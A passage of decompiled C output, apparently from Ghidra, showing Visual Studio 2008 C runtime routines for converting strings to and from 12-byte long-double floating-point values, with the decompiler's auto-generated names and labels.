    if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
      p_Var12 = (_LDBL12 *)((uint)local_24[iVar6] & ~(-1 << (bVar7 & 0x1f)));
      while( true ) {
        if (p_Var12 != (_LDBL12 *)0x0) {
          iVar6 = (int)(iVar15 + (iVar15 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (_LDBL12 *)0x0;
          puVar11 = (undefined *)(1 << (0x1f - ((byte)iVar15 & 0x1f) & 0x1f));
          pp_Var8 = local_24 + iVar6;
          _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + (int)puVar11);
          if (_Ifp < *pp_Var8) goto LAB_0041fe9f;
          bVar16 = _Ifp < puVar11;
          do {
            local_8 = (_LDBL12 *)0x0;
            if (!bVar16) goto LAB_0041fea6;
LAB_0041fe9f:
            do {
              local_8 = (_LDBL12 *)0x1;
LAB_0041fea6:
              iVar6 = iVar6 + -1;
              *pp_Var8 = _Ifp;
              if ((iVar6 < 0) || (local_8 == (_LDBL12 *)0x0)) {
                _Ifp = local_8;
                goto LAB_0041feb4;
              }
              local_8 = (_LDBL12 *)0x0;
              pp_Var8 = local_24 + iVar6;
              _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + 1);
            } while (_Ifp < *pp_Var8);
            bVar16 = _Ifp == (_LDBL12 *)0x0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        p_Var12 = local_24[iVar6];
      }
    }
LAB_0041feb4:
    *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_c & 0x1f));
    iVar6 = local_10 + 1;
    if (iVar6 < 3) {
      pp_Var9 = local_24 + iVar6;
      for (iVar15 = 3 - iVar6; iVar15 != 0; iVar15 = iVar15 + -1) {
        *pp_Var9 = (_LDBL12 *)0x0;
        pp_Var9 = pp_Var9 + 1;
      }
    }
    if (_Ifp != (_LDBL12 *)0x0) {
      iVar14 = uVar13 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_0042c07c - DAT_0042c080)) {
      local_24[0] = (_LDBL12 *)0x0;
      local_24[1] = (_LDBL12 *)0x0;
    }
    else {
      if (DAT_0042c07c < iVar14) {
        if (iVar14 < DAT_0042c078) {
          local_24[0] = (_LDBL12 *)((uint)local_24[0] & 0x7fffffff);
          iVar14 = iVar14 + DAT_0042c08c;
          iVar4 = (int)(DAT_0042c084 + ((int)DAT_0042c084 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_0042c084 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            local_14 = (uint)local_24[(int)_Ifp] & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] =
                 (_LDBL12 *)((uint)local_24[(int)_Ifp] >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar6 = 2;
          pp_Var9 = local_24 + (2 - iVar4);
          do {
            if (iVar6 < iVar4) {
              local_24[iVar6] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar6] = *pp_Var9;
            }
            iVar6 = iVar6 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar6);
          IVar5 = INTRNCVT_OK;
        }
        else {
          local_24[1] = (_LDBL12 *)0x0;
          local_1c = 0;
          local_24[0] = (_LDBL12 *)0x80000000;
          iVar14 = (int)(DAT_0042c084 + ((int)DAT_0042c084 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_0042c084 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            p_Var2 = local_24[(int)_Ifp];
            local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar4 = 2;
          pp_Var9 = local_24 + (2 - iVar14);
          do {
            if (iVar4 < iVar14) {
              local_24[iVar4] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar4] = *pp_Var9;
            }
            iVar4 = iVar4 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar4);
          iVar14 = DAT_0042c08c + DAT_0042c078;
          IVar5 = INTRNCVT_OVERFLOW;
        }
        goto LAB_0042026b;
      }
      local_14 = DAT_0042c07c - local_14;
      local_24[0] = p_Var2;
      local_24[1] = (_LDBL12 *)uVar3;
      iVar14 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
      iVar4 = DAT_0042c080 - 1;
      iVar14 = (int)(DAT_0042c080 + ((int)DAT_0042c080 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_0042c080 & 0x8000001f;
      local_10 = iVar14;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar7 = (byte)(0x1f - uVar13);
      pp_Var9 = local_24 + iVar14;
      local_14 = 0x1f - uVar13;
      if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
        p_Var2 = (_LDBL12 *)((uint)local_24[iVar14] & ~(-1 << (bVar7 & 0x1f)));
        while (p_Var2 == (_LDBL12 *)0x0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_00420057;
          p_Var2 = local_24[iVar14];
        }
        iVar14 = (int)(iVar4 + (iVar4 >> 0x1f & 0x1fU)) >> 5;
        bVar16 = false;
        p_Var12 = (_LDBL12 *)(1 << (0x1f - ((byte)iVar4 & 0x1f) & 0x1f));
        p_Var2 = local_24[iVar14];
        puVar1 = p_Var12->ld12 + (int)p_Var2->ld12;
        if ((puVar1 < p_Var2) || (puVar1 < p_Var12)) {
          bVar16 = true;
        }
        local_24[iVar14] = (_LDBL12 *)puVar1;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar16))) {
          p_Var2 = local_24[iVar14];
          puVar1 = p_Var2->ld12 + 1;
          bVar16 = false;
          if ((puVar1 < p_Var2) || (puVar1 == (uchar *)0x0)) {
            bVar16 = true;
          }
          local_24[iVar14] = (_LDBL12 *)puVar1;
        }
      }
LAB_00420057:
      *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_14 & 0x1f));
      iVar14 = local_10 + 1;
      if (iVar14 < 3) {
        pp_Var9 = local_24 + iVar14;
        for (iVar4 = 3 - iVar14; iVar4 != 0; iVar4 = iVar4 + -1) {
          *pp_Var9 = (_LDBL12 *)0x0;
          pp_Var9 = pp_Var9 + 1;
        }
      }
      uVar13 = DAT_0042c084 + 1;
      iVar14 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
    }
    iVar14 = 0;
    IVar5 = INTRNCVT_UNDERFLOW;
  }
LAB_0042026b:
  uVar13 = iVar14 << (0x1fU - (char)DAT_0042c084 & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24[0];
  if (DAT_0042c088 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar13;
    *(_LDBL12 **)&_D->x = local_24[1];
  }
  else if (DAT_0042c088 == 0x20) {
    *(uint *)&_D->x = uVar13;
  }
  return IVar5;
}



// Library Function - Single Match
//  ___strgtold12_l
// 
// Library: Visual Studio 2008 Release

uint __cdecl
___strgtold12_l(_LDBL12 *pld12,char **p_end_ptr,char *str,int mult12,int scale,int decpt,
               int implicit_E,_locale_t _Locale)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  bool bVar4;
  bool bVar5;
  bool bVar6;
  ushort uVar7;
  char cVar8;
  int *piVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  ushort uVar14;
  int iVar15;
  undefined *puVar16;
  ushort uVar17;
  char *pcVar18;
  undefined4 uVar19;
  ushort uVar20;
  undefined4 uVar21;
  char *pcVar22;
  short *psVar23;
  int local_6c;
  int local_68;
  int *local_64;
  ushort *local_60;
  int local_5c;
  char *local_58;
  int local_54;
  uint local_50;
  undefined2 local_4c;
  undefined4 uStack_4a;
  undefined2 uStack_46;
  int local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 uStack_38;
  byte local_30;
  undefined uStack_2f;
  undefined4 uStack_2e;
  undefined4 uStack_2a;
  ushort uStack_26;
  char local_24 [23];
  char local_d;
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  iVar15 = 0;
  pcVar22 = local_24;
  uVar7 = 0;
  local_6c = 1;
  local_50 = 0;
  bVar4 = false;
  bVar6 = false;
  bVar5 = false;
  local_68 = 0;
  local_54 = 0;
  if (_Locale != (_locale_t)0x0) {
    local_58 = str;
    for (; (((cVar8 = *str, cVar8 == ' ' || (cVar8 == '\t')) || (cVar8 == '\n')) || (cVar8 == '\r'))
        ; str = str + 1) {
    }
LAB_00420335:
    cVar8 = *str;
    pcVar18 = str + 1;
    switch(iVar15) {
    case 0:
      if ((byte)(cVar8 - 0x31U) < 9) {
LAB_00420352:
        iVar15 = 3;
        goto LAB_00420354;
      }
      if (cVar8 == **(char **)_Locale->locinfo[1].lc_codepage) {
LAB_00420369:
        iVar15 = 5;
        str = pcVar18;
      }
      else if (cVar8 == '+') {
        uVar7 = 0;
        iVar15 = 2;
        str = pcVar18;
      }
      else {
        if (cVar8 != '-') {
          if (cVar8 == '0') goto LAB_00420383;
          goto LAB_0042050e;
        }
        iVar15 = 2;
        uVar7 = 0x8000;
        str = pcVar18;
      }
      goto LAB_00420335;
    case 1:
      bVar4 = true;
      if ((byte)(cVar8 - 0x31U) < 9) goto LAB_00420352;
      if (cVar8 == **(char **)_Locale->locinfo[1].lc_codepage) goto LAB_004203ba;
      if ((cVar8 == '+') || (cVar8 == '-')) goto LAB_004203ea;
      if (cVar8 == '0') goto LAB_00420383;
      goto LAB_004203ca;
    case 2:
      if ((byte)(cVar8 - 0x31U) < 9) goto LAB_00420352;
      if (cVar8 == **(char **)_Locale->locinfo[1].lc_codepage) goto LAB_00420369;
      str = local_58;
      if (cVar8 != '0') goto LAB_00420539;
LAB_00420383:
      iVar15 = 1;
      str = pcVar18;
      goto LAB_00420335;
    case 3:
      while (('/' < cVar8 && (cVar8 < ':'))) {
        if (local_50 < 0x19) {
          local_50 = local_50 + 1;
          *pcVar22 = cVar8 + -0x30;
          pcVar22 = pcVar22 + 1;
        }
        else {
          local_54 = local_54 + 1;
        }
        cVar8 = *pcVar18;
        pcVar18 = pcVar18 + 1;
      }
      if (cVar8 != **(char **)_Locale->locinfo[1].lc_codepage) goto LAB_0042045d;
LAB_004203ba:
      bVar4 = true;
      iVar15 = 4;
      str = pcVar18;
      goto LAB_00420335;
    case 4:
      bVar6 = true;
      if (local_50 == 0) {
        while (cVar8 == '0') {
          local_54 = local_54 + -1;
          cVar8 = *pcVar18;
          pcVar18 = pcVar18 + 1;
        }
      }
      while (('/' < cVar8 && (cVar8 < ':'))) {
        if (local_50 < 0x19) {
          local_50 = local_50 + 1;
          *pcVar22 = cVar8 + -0x30;
          pcVar22 = pcVar22 + 1;
          local_54 = local_54 + -1;
        }
        cVar8 = *pcVar18;
        pcVar18 = pcVar18 + 1;
      }
LAB_0042045d:
      if ((cVar8 == '+') || (cVar8 == '-')) {
LAB_004203ea:
        bVar4 = true;
        iVar15 = 0xb;
        str = pcVar18 + -1;
      }
      else {
LAB_004203ca:
        bVar4 = true;
        if ((cVar8 < 'D') || (('E' < cVar8 && ((cVar8 < 'd' || ('e' < cVar8)))))) goto LAB_0042050e;
        iVar15 = 6;
        str = pcVar18;
      }
      goto LAB_00420335;
    case 5:
      bVar6 = true;
      str = local_58;
      if ((byte)(cVar8 - 0x30U) < 10) {
        iVar15 = 4;
        goto LAB_00420354;
      }
      goto LAB_00420539;
    case 6:
      local_58 = str + -1;
      if (8 < (byte)(cVar8 - 0x31U)) {
        if (cVar8 == '+') goto LAB_004204f5;
        if (cVar8 == '-') goto LAB_004204e9;
LAB_004204dc:
        str = local_58;
        if (cVar8 != '0') goto LAB_00420539;
        iVar15 = 8;
        str = pcVar18;
        goto LAB_00420335;
      }
      break;
    case 7:
      if (8 < (byte)(cVar8 - 0x31U)) goto LAB_004204dc;
      break;
    case 8:
      bVar5 = true;
      while (cVar8 == '0') {
        cVar8 = *pcVar18;
        pcVar18 = pcVar18 + 1;
      }
      if (8 < (byte)(cVar8 - 0x31U)) goto LAB_0042050e;
      break;
    case 9:
      bVar5 = true;
      local_68 = 0;
      goto LAB_0042059b;
    default:
      goto switchD_00420341_caseD_a;
    case 0xb:
      if (implicit_E != 0) {
        local_58 = str;
        if (cVar8 == '+') {
LAB_004204f5:
          iVar15 = 7;
          str = pcVar18;
        }
        else {
          if (cVar8 != '-') goto LAB_00420539;
LAB_004204e9:
          local_6c = -1;
          iVar15 = 7;
          str = pcVar18;
        }
        goto LAB_00420335;
      }
      iVar15 = 10;
      pcVar18 = str;
switchD_00420341_caseD_a:
      str = pcVar18;
      if (iVar15 != 10) goto LAB_00420335;
      goto LAB_00420539;
    }
    iVar15 = 9;
LAB_00420354:
    str = pcVar18 + -1;
    goto LAB_00420335;
  }
  piVar9 = __errno();
  *piVar9 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  uVar3 = CONCAT22(local_40._2_2_,(undefined2)local_40);
  uVar12 = CONCAT22(uStack_38._2_2_,(ushort)uStack_38);
  goto LAB_00420966;
LAB_0042059b:
  if ((cVar8 < '0') || ('9' < cVar8)) goto LAB_004205b6;
  local_68 = local_68 * 10 + -0x30 + (int)cVar8;
  if (local_68 < 0x1451) {
    cVar8 = *pcVar18;
    pcVar18 = pcVar18 + 1;
    goto LAB_0042059b;
  }
  local_68 = 0x1451;
LAB_004205b6:
  while (('/' < cVar8 && (cVar8 < ':'))) {
    cVar8 = *pcVar18;
    pcVar18 = pcVar18 + 1;
  }
LAB_0042050e:
  str = pcVar18 + -1;
LAB_00420539:
  *p_end_ptr = str;
  if (bVar4) {
    if (0x18 < local_50) {
      if ('\x04' < local_d) {
        local_d = local_d + '\x01';
      }
      pcVar22 = pcVar22 + -1;
      local_54 = local_54 + 1;
      local_50 = 0x18;
    }
    if (local_50 == 0) goto LAB_00420948;
    while (pcVar22 = pcVar22 + -1, *pcVar22 == '\0') {
      local_50 = local_50 - 1;
      local_54 = local_54 + 1;
    }
    ___mtold12(local_24,local_50,&local_40);
    iVar2 = CONCAT22(local_3c._2_2_,(undefined2)local_3c);
    uVar3 = CONCAT22(local_40._2_2_,(undefined2)local_40);
    iVar1 = CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a);
    uVar13 = CONCAT22(uStack_2e._2_2_,(ushort)uStack_2e);
    uVar12 = CONCAT22(uStack_38._2_2_,(ushort)uStack_38);
    uVar11 = CONCAT22(uStack_38._2_2_,(ushort)uStack_38);
    iVar15 = CONCAT22(uStack_4a._2_2_,(undefined2)uStack_4a);
    if (local_6c < 0) {
      local_68 = -local_68;
    }
    local_58 = (char *)(local_68 + local_54);
    if (!bVar5) {
      local_58 = (char *)((int)local_58 + scale);
    }
    if (!bVar6) {
      local_58 = (char *)((int)local_58 - decpt);
    }
    if ((int)local_58 < 0x1451) {
      if ((int)local_58 < -0x1450) goto LAB_00420948;
      puVar16 = &DAT_0042c0a0;
      if (local_58 != (char *)0x0) {
        if ((int)local_58 < 0) {
          local_58 = (char *)-(int)local_58;
          puVar16 = &DAT_0042c200;
        }
        if (mult12 == 0) {
          local_40._0_2_ = 0;
        }
        iVar15 = uStack_4a;
        uVar11 = uVar12;
        uVar13 = uStack_2e;
        iVar1 = uStack_2a;
        uVar3 = CONCAT22(local_40._2_2_,(undefined2)local_40);
        iVar2 = local_3c;
joined_r0x00420643:
        if (local_58 != (char *)0x0) {
          uStack_38._2_2_ = (ushort)(uVar11 >> 0x10);
          uVar12 = (int)local_58 >> 3;
          puVar16 = puVar16 + 0x54;
          uVar10 = (uint)local_58 & 7;
          local_58 = (char *)uVar12;
          if (uVar10 != 0) {
            piVar9 = (int *)(puVar16 + uVar10 * 0xc);
            if (0x7fff < *(ushort *)piVar9) {
              local_4c = (undefined2)*piVar9;
              uStack_4a._0_2_ = (undefined2)((uint)*piVar9 >> 0x10);
              uStack_4a._2_2_ = (undefined2)piVar9[1];
              uStack_46 = (undefined2)((uint)piVar9[1] >> 0x10);
              local_44 = piVar9[2];
              iVar15 = CONCAT22(uStack_4a._2_2_,(undefined2)uStack_4a) + -1;
              uStack_4a._0_2_ = (undefined2)iVar15;
              uStack_4a._2_2_ = (undefined2)((uint)iVar15 >> 0x10);
              piVar9 = (int *)&local_4c;
            }
            local_54 = 0;
            local_30 = 0;
            uStack_2f = 0;
            uStack_2e._0_2_ = 0;
            uStack_2e._2_2_ = 0;
            uVar13 = 0;
            uStack_2a._0_2_ = 0;
            uStack_2a._2_2_ = 0;
            iVar1 = 0;
            uStack_26 = 0;
            uVar14 = *(ushort *)((int)piVar9 + 10) & 0x7fff;
            uVar20 = (*(ushort *)((int)piVar9 + 10) ^ uStack_38._2_2_) & 0x8000;
            uVar17 = uVar14 + (uStack_38._2_2_ & 0x7fff);
            if ((((uStack_38._2_2_ & 0x7fff) < 0x7fff) && (uVar14 < 0x7fff)) && (uVar17 < 0xbffe)) {
              if (0x3fbf < uVar17) {
                if ((((uVar11 & 0x7fff0000) == 0) &&
                    (uVar17 = uVar17 + 1, (uVar11 & 0x7fffffff) == 0)) &&
                   ((iVar2 == 0 && (uVar3 == 0)))) {
                  uStack_38._2_2_ = 0;
                  uVar11 = uVar11 & 0xffff;
                  uVar13 = 0;
                  iVar1 = 0;
                }
                else if (((uVar14 == 0) && (uVar17 = uVar17 + 1, (piVar9[2] & 0x7fffffffU) == 0)) &&
                        ((piVar9[1] == 0 && (*piVar9 == 0)))) {
                  uStack_38._0_2_ = 0;
                  uStack_38._2_2_ = 0;
                  uVar11 = 0;
                  local_3c._0_2_ = 0;
                  local_3c._2_2_ = 0;
                  local_40._0_2_ = 0;
                  local_40._2_2_ = 0;
                  uVar3 = 0;
                  iVar2 = 0;
                }
                else {
                  local_6c = 0;
                  psVar23 = (short *)((int)&uStack_2e + 2);
                  local_5c = 5;
                  do {
                    local_68 = local_5c;
                    if (0 < local_5c) {
                      local_60 = (ushort *)((int)&local_40 + local_6c * 2);
                      local_64 = piVar9 + 2;
                      do {
                        bVar4 = false;
                        uVar13 = *(uint *)(psVar23 + -2) +
                                 (uint)*(ushort *)local_64 * (uint)*local_60;
                        if ((uVar13 < *(uint *)(psVar23 + -2)) ||
                           (uVar13 < (uint)*(ushort *)local_64 * (uint)*local_60)) {
                          bVar4 = true;
                        }
                        *(uint *)(psVar23 + -2) = uVar13;
                        if (bVar4) {
                          *psVar23 = *psVar23 + 1;
                        }
                        local_60 = local_60 + 1;
                        local_64 = (int *)((int)local_64 + -2);
                        local_68 = local_68 + -1;
                      } while (0 < local_68);
                    }
                    psVar23 = psVar23 + 1;
                    local_6c = local_6c + 1;
                    local_5c = local_5c + -1;
                  } while (0 < local_5c);
                  uVar17 = uVar17 + 0xc002;
                  if ((short)uVar17 < 1) {
LAB_004207fe:
                    uVar17 = uVar17 - 1;
                    if ((short)uVar17 < 0) {
                      uVar13 = (uint)(ushort)-uVar17;
                      uVar17 = 0;
                      do {
                        if ((local_30 & 1) != 0) {
                          local_54 = local_54 + 1;
                        }
                        iVar2 = CONCAT22(uStack_26,uStack_2a._2_2_);
                        uVar11 = CONCAT22((ushort)uStack_2a,uStack_2e._2_2_);
                        iVar1 = CONCAT22((ushort)uStack_2a,uStack_2e._2_2_);
                        uStack_2a._2_2_ = (ushort)(CONCAT22(uStack_26,uStack_2a._2_2_) >> 1);
                        uStack_26 = uStack_26 >> 1;
                        uStack_2a._0_2_ =
                             (ushort)uStack_2a >> 1 | (ushort)((uint)(iVar2 << 0x1f) >> 0x10);
                        uVar12 = CONCAT22((ushort)uStack_2e,CONCAT11(uStack_2f,local_30)) >> 1;
                        uStack_2e._0_2_ =
                             (ushort)uStack_2e >> 1 | (ushort)((uint)(iVar1 << 0x1f) >> 0x10);
                        uVar13 = uVar13 - 1;
                        uStack_2e._2_2_ = (ushort)(uVar11 >> 1);
                        local_30 = (byte)uVar12;
                        uStack_2f = (undefined)(uVar12 >> 8);
                      } while (uVar13 != 0);
                      if (local_54 != 0) {
                        local_30 = local_30 | 1;
                      }
                    }
                  }
                  else {
                    do {
                      uVar14 = (ushort)uStack_2e;
                      if ((short)uStack_26 < 0) break;
                      iVar1 = CONCAT22((ushort)uStack_2e,CONCAT11(uStack_2f,local_30)) << 1;
                      local_30 = (byte)iVar1;
                      uStack_2f = (undefined)((uint)iVar1 >> 8);
                      uStack_2e._0_2_ = (ushort)((uint)iVar1 >> 0x10);
                      iVar1 = CONCAT22((ushort)uStack_2a,uStack_2e._2_2_) * 2;
                      uStack_2e._2_2_ = (ushort)iVar1 | uVar14 >> 0xf;
                      iVar2 = CONCAT22(uStack_26,uStack_2a._2_2_) * 2;
                      uStack_2a._2_2_ = (ushort)iVar2 | (ushort)uStack_2a >> 0xf;
                      uVar17 = uVar17 - 1;
                      uStack_2a._0_2_ = (ushort)((uint)iVar1 >> 0x10);
                      uStack_26 = (ushort)((uint)iVar2 >> 0x10);
                    } while (0 < (short)uVar17);
                    if ((short)uVar17 < 1) goto LAB_004207fe;
                  }
                  if ((0x8000 < CONCAT11(uStack_2f,local_30)) ||
                     (iVar1 = CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a),
                     uVar13 = CONCAT22(uStack_2e._2_2_,(ushort)uStack_2e),
                     (CONCAT22((ushort)uStack_2e,CONCAT11(uStack_2f,local_30)) & 0x1ffff) == 0x18000
                     )) {
                    if (CONCAT22(uStack_2e._2_2_,(ushort)uStack_2e) == -1) {
                      uStack_2e._0_2_ = 0;
                      uStack_2e._2_2_ = 0;
                      uVar13 = 0;
                      if (CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a) == -1) {
                        uStack_2a._0_2_ = 0;
                        uStack_2a._2_2_ = 0;
                        if (uStack_26 == 0xffff) {
                          uStack_26 = 0x8000;
                          uVar17 = uVar17 + 1;
                          iVar1 = 0;
                          uVar13 = 0;
                        }
                        else {
                          uStack_26 = uStack_26 + 1;
                          iVar1 = 0;
                          uVar13 = 0;
                        }
                      }
                      else {
                        iVar1 = CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a) + 1;
                        uStack_2a._0_2_ = (ushort)iVar1;
                        uStack_2a._2_2_ = (ushort)((uint)iVar1 >> 0x10);
                      }
                    }
                    else {
                      uVar13 = CONCAT22(uStack_2e._2_2_,(ushort)uStack_2e) + 1;
                      uStack_2e._0_2_ = (ushort)uVar13;
                      uStack_2e._2_2_ = (ushort)(uVar13 >> 0x10);
                      iVar1 = CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a);
                    }
                  }
                  uStack_2e._2_2_ = (ushort)(uVar13 >> 0x10);
                  uStack_2e._0_2_ = (ushort)uVar13;
                  uStack_2a._2_2_ = (ushort)((uint)iVar1 >> 0x10);
                  uStack_2a._0_2_ = (ushort)iVar1;
                  if (uVar17 < 0x7fff) {
                    local_40._0_2_ = (ushort)uStack_2e;
                    local_40._2_2_ = uStack_2e._2_2_;
                    local_3c._0_2_ = (ushort)uStack_2a;
                    local_3c._2_2_ = uStack_2a._2_2_;
                    uStack_38._0_2_ = uStack_26;
                    uStack_38._2_2_ = uVar17 | uVar20;
                    uVar11 = CONCAT22(uVar17 | uVar20,uStack_26);
                    uVar3 = uVar13;
                    iVar2 = iVar1;
                  }
                  else {
                    local_3c._0_2_ = 0;
                    local_3c._2_2_ = 0;
                    local_40._0_2_ = 0;
                    local_40._2_2_ = 0;
                    uVar11 = ((uVar20 == 0) - 1 & 0x80000000) + 0x7fff8000;
                    uStack_38._0_2_ = (ushort)uVar11;
                    uStack_38._2_2_ = (ushort)(uVar11 >> 0x10);
                    uVar3 = 0;
                    iVar2 = 0;
                  }
                }
                goto joined_r0x00420643;
              }
              uVar11 = 0;
              local_3c._0_2_ = 0;
              local_3c._2_2_ = 0;
              local_40._0_2_ = 0;
              local_40._2_2_ = 0;
            }
            else {
              local_3c._0_2_ = 0;
              local_3c._2_2_ = 0;
              uVar11 = ((uVar20 == 0) - 1 & 0x80000000) + 0x7fff8000;
              local_40._0_2_ = 0;
              local_40._2_2_ = 0;
            }
            uStack_38._0_2_ = (ushort)uVar11;
            uStack_38._2_2_ = (ushort)(uVar11 >> 0x10);
            uVar13 = 0;
            iVar1 = 0;
            uVar3 = 0;
            iVar2 = 0;
          }
          goto joined_r0x00420643;
        }
      }
      local_3c._2_2_ = (undefined2)((uint)iVar2 >> 0x10);
      local_3c._0_2_ = (undefined2)iVar2;
      local_40._2_2_ = (undefined2)(uVar3 >> 0x10);
      local_40._0_2_ = (undefined2)uVar3;
      uStack_38._2_2_ = (ushort)(uVar11 >> 0x10);
      uStack_38._0_2_ = (ushort)uVar11;
      uVar21 = CONCAT22((undefined2)local_3c,local_40._2_2_);
      uVar19 = CONCAT22((ushort)uStack_38,local_3c._2_2_);
      uStack_4a = iVar15;
      uVar12 = uVar11;
      uStack_2e = uVar13;
      uStack_2a = iVar1;
      local_3c = iVar2;
    }
    else {
      uVar21 = 0;
      uStack_38._2_2_ = 0x7fff;
      uVar19 = 0x80000000;
      local_40._0_2_ = 0;
    }
  }
  else {
LAB_00420948:
    uVar3 = CONCAT22(local_40._2_2_,(undefined2)local_40);
    uVar12 = CONCAT22(uStack_38._2_2_,(ushort)uStack_38);
    local_40._0_2_ = 0;
    uStack_38._2_2_ = 0;
    uVar19 = 0;
    uVar21 = 0;
  }
  *(undefined2 *)pld12->ld12 = (undefined2)local_40;
  *(ushort *)(pld12->ld12 + 10) = uStack_38._2_2_ | uVar7;
  *(undefined4 *)(pld12->ld12 + 2) = uVar21;
  *(undefined4 *)(pld12->ld12 + 6) = uVar19;
LAB_00420966:
  uStack_38 = uVar12;
  local_40 = uVar3;
  uVar13 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return uVar13;
}



// WARNING: Removing unreachable block (ram,0x00420ee1)
// WARNING: Removing unreachable block (ram,0x00420eeb)
// WARNING: Removing unreachable block (ram,0x00420ef0)
// Library Function - Single Match
//  _$I10_OUTPUT
// 
// Library: Visual Studio 2008 Release

void __cdecl
__I10_OUTPUT(int param_1,uint param_2,ushort param_3,int param_4,byte param_5,short *param_6)

{
  short *psVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  bool bVar6;
  errno_t eVar7;
  ushort *puVar8;
  ushort uVar9;
  ushort uVar10;
  int *piVar11;
  int iVar12;
  ushort uVar13;
  uint uVar14;
  char cVar15;
  uint uVar16;
  short *psVar17;
  short *psVar18;
  ushort uVar19;
  ushort uVar20;
  int iVar21;
  uint uVar22;
  uint uVar23;
  uint uVar24;
  undefined4 *puVar25;
  char *pcVar26;
  ushort *local_70;
  int *local_6c;
  undefined *local_68;
  int local_5c;
  int local_58;
  int local_54;
  short local_50;
  ushort *local_4c;
  int local_48;
  int local_44;
  undefined2 local_40;
  undefined4 uStack_3e;
